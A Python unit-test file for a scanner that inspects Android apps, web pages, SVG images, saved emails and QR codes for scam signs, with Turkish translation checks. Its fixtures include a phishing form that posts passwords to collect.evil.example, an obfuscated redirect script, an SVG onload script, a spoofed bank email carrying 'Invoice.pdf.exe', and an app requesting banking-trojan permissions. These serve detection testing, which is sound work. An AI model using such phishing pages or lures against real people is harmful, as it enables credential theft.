"""Format inspectors: apps, web pages, SVG, saved emails, Office macros and QR images."""
import io
import struct
import unittest
import zipfile

from services import format_inspectors as fi
from services.report_i18n import translate


def axml(package, permissions, sms_receiver=False):
    """A minimal binary AndroidManifest.xml (UTF-16 string pool)."""
    strings = ['manifest', 'package', package, 'uses-permission', 'name', 'action', 'android.provider.Telephony.SMS_RECEIVED'] + permissions
    index = {s: i for i, s in enumerate(strings)}
    body = b''.join(struct.pack('<H', len(s)) + s.encode('utf-16-le') + b'\0\0' for s in strings)
    offsets, at = [], 0
    for s in strings:
        offsets.append(at)
        at += 2 + len(s) * 2 + 2
    body += b'\0' * (-len(body) % 4)
    pool_header = 28 + 4 * len(strings)
    pool = struct.pack('<HHIIIIII', 0x0001, 28, pool_header + len(body), len(strings), 0, 0, pool_header, 0)
    pool += b''.join(struct.pack('<I', o) for o in offsets) + body

    def element(tag, attributes):
        attrs = b''.join(struct.pack('<IIIHBBI', 0xFFFFFFFF, index[n], index[v], 8, 0, 3, index[v]) for n, v in attributes)
        return struct.pack('<HHIIIIIHHHHHH', 0x0102, 16, 36 + len(attrs), 1, 0xFFFFFFFF, 0xFFFFFFFF, index[tag], 20, 20, len(attributes), 0, 0, 0) + attrs

    chunks = element('manifest', [('package', package)])
    chunks += b''.join(element('uses-permission', [('name', p)]) for p in permissions)
    if sms_receiver:
        chunks += element('action', [('name', 'android.provider.Telephony.SMS_RECEIVED')])
    document = pool + chunks
    return struct.pack('<HHI', 0x0003, 8, 8 + len(document)) + document


def apk(manifest):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, 'w') as archive:
        archive.writestr('AndroidManifest.xml', manifest)
        archive.writestr('classes.dex', b'dex\n035\0')
    return stream.getvalue()


class ApkTests(unittest.TestCase):
    def test_banking_trojan_permissions_ask_for_review(self):
        data = apk(axml('com.kargo.takip', ['android.permission.RECEIVE_SMS', 'android.permission.BIND_ACCESSIBILITY_SERVICE', 'android.permission.INTERNET']))
        result = fi.inspect(data, 'kargo.apk', {'actual_type': 'zip'})
        self.assertEqual(result['format'], 'apk')
        self.assertEqual(result['facts']['package'], 'com.kargo.takip')
        self.assertTrue(result['raises_review'])
        self.assertEqual(result['row'], {'name': 'App permissions', 'state': 'warn', 'result': '2 risky'})
        self.assertEqual(result['findings'][0]['title'], 'The app asks for risky permissions')

    def test_plain_app_is_noted_but_not_flagged(self):
        result = fi.inspect(apk(axml('org.example.notes', ['android.permission.INTERNET'])), 'notes.apk', {'actual_type': 'zip'})
        self.assertFalse(result['raises_review'])
        self.assertEqual([f['title'] for f in result['findings']], ['It is an Android app'])

    def test_broken_manifest_is_unavailable_not_a_crash(self):
        result = fi.inspect(apk(b'\x03\x00\x08\x00garbage'), 'x.apk', {'actual_type': 'zip'})
        self.assertEqual(result['status'], 'unavailable')
        self.assertIsNone(fi.inspect(apk(b'')[:0] or self.zip_without_manifest(), 'x.zip', {'actual_type': 'zip'}))

    def zip_without_manifest(self):
        stream = io.BytesIO()
        with zipfile.ZipFile(stream, 'w') as archive:
            archive.writestr('readme.txt', 'hi')
        return stream.getvalue()


class WebTests(unittest.TestCase):
    def test_phishing_attachment_with_password_form(self):
        page = b'<html><body><form action="https://collect.evil.example/p"><input type="password" name="p"></form></body></html>'
        result = fi.inspect(page, 'Invoice.html', {'actual_type': 'txt'})
        self.assertTrue(result['raises_review'])
        self.assertIn('collect.evil.example', result['findings'][0]['detail'])
        self.assertEqual(result['row']['result'], 'Asks for a password')

    def test_redirects_and_hidden_code(self):
        page = b'<html><script>var u=atob("aHR0cHM6Ly9ldmls");window.location="https://evil.example/x"</script></html>'
        titles = [f['title'] for f in fi.inspect(page, 'a.htm', {'actual_type': 'txt'})['findings']]
        self.assertEqual(titles, ['It hides its code', 'It sends you to another site'])

    def test_ordinary_page_only_lists_links(self):
        page = b'<!doctype html><html><a href="https://example.com/a">a</a></html>'
        result = fi.inspect(page, 'page.html', {'actual_type': 'txt'})
        self.assertFalse(result['raises_review'])
        self.assertEqual(result['findings'][0]['detail'], '1 site is linked: example.com.')

    def test_svg_with_script_is_flagged_and_plain_svg_is_not(self):
        bad = fi.inspect(b'<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(1)"><rect/></svg>', 'logo.svg', {'actual_type': 'txt'})
        good = fi.inspect(b'<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>', 'logo.svg', {'actual_type': 'txt'})
        self.assertTrue(bad['raises_review']);self.assertFalse(good['raises_review'])
        self.assertEqual(bad['findings'][0]['title'], 'The image contains code')


class EmailTests(unittest.TestCase):
    def test_saved_email_with_risky_attachment_and_failed_checks(self):
        message = (b'From: "Bank" <alerts@bank.example>\r\nReply-To: help@other.example\r\nSubject: Verify\r\n'
                   b'Authentication-Results: mx; spf=fail smtp.mailfrom=bank.example; dkim=pass\r\nMIME-Version: 1.0\r\n'
                   b'Content-Type: multipart/mixed; boundary=b\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nSee https://bank-verify.example/login\r\n'
                   b'--b\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename="Invoice.pdf.exe"\r\n\r\nMZ\r\n--b--\r\n')
        result = fi.inspect(message, 'mail.eml', {'actual_type': 'txt'})
        titles = [f['title'] for f in result['findings']]
        self.assertEqual(titles, ['It has a risky attachment', 'The sender couldn’t be verified', 'Replies go somewhere else', 'It contains links'])
        self.assertTrue(result['raises_review'])
        self.assertEqual(result['facts']['linked_sites'], ['bank-verify.example'])


class ImageTests(unittest.TestCase):
    def test_qr_code_link_is_reported_without_changing_the_verdict(self):
        import zxingcpp
        from PIL import Image
        code = zxingcpp.create_barcode('https://kargo-odeme.example/pay', zxingcpp.BarcodeFormat.QRCode).to_image(scale=4)
        stream = io.BytesIO()
        Image.frombytes('L', (code.shape[1], code.shape[0]), bytes(memoryview(code))).save(stream, 'PNG')
        result = fi.inspect(stream.getvalue(), 'poster.png', {'actual_type': 'png', 'is_image': True})
        self.assertFalse(result['raises_review'])
        self.assertEqual(result['facts']['qr_links'], ['https://kargo-odeme.example/pay'])
        self.assertIn('kargo-odeme.example', result['findings'][0]['detail'])


class TranslationTests(unittest.TestCase):
    def test_every_inspector_sentence_has_turkish(self):
        samples = [
            'It can read incoming text messages. Banking malware uses this to steal one-time codes.',
            'It can control the screen through accessibility, and asks for 2 more risky permissions. Banking malware uses these to steal one-time codes.',
            '1 site is linked: example.com.', '3 sites are linked, for example example.com.',
            'The code leads to evil.example. Check that link with the URL scanner before you open it.',
            '“Invoice.pdf.exe” is a type of file scammers use to install malware or show fake login pages.',
            'It comes from bank.example, but replies go to other.example.',
            'This file shows a login form that sends what you type to evil.example. Real companies don’t send login pages as files.',
            'Opening it jumps straight to evil.example.', '2 risky', '3 safe-looking',
            'They start as soon as the document opens and can run programs or download files (Shell, CreateObject).',
        ]
        for text in samples:
            with self.subTest(text=text):
                self.assertNotEqual(translate(text, 'tr'), text)


if __name__ == '__main__':
    unittest.main()
